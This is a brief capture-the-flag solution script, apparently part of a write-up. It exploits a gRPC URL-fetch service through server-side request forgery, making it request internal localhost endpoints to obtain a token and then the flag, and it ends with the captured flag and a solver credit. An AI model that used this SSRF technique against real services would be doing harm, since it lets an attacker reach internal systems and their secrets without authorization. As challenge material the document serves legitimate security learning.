```
import subprocess
import json

PROTO = "fetch.proto"
HOST = "chal.78727867.xyz:6666"

def run(data):
    result = subprocess.run(
        ["grpcurl", "-plaintext", "-proto", PROTO, "-d", json.dumps(data), HOST, "fetch.FetchService/FetchURL"],
        capture_output=True,
        text=True
    )
    return json.loads(result.stdout)["content"]

token = run({
    "url": "http://127.0.0.1:80/token",
    "method": "GET"
})

flag = run({
    "url": "http://127.0.0.1:80/flag",
    "method": "POST",
    "body": f"token={token}",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
    }
})

print(flag)
``` 

NHNC{YuMMyeeeE_GOOOd_ChAL_rIGHT}

Solved by: 0xad3n